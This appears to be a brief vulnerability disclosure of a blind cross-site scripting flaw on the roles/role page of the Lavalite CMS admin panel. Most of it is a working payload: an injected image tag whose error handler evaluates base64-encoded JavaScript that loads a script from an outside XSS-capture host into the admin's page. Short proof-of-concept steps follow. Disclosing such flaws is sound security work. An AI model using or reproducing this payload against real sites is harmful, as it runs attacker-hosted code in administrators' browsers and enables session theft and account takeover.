# Description
Blind XSS triggered at roles/role page of lavalite CMS admin account.
# Payload USED
```
"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYmVlZmVlLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; onerror=eval(atob(this.id))>
```
# POC
* go to roles/role page edit/create role with xss payload
* Booyah!!! XSS triggered.
# PermaLinks
[drive link](https://drive.google.com/drive/folders/1BZE6wJ_3YhzzzNTukawqjsRLaaxJDzXK?usp=sharing)
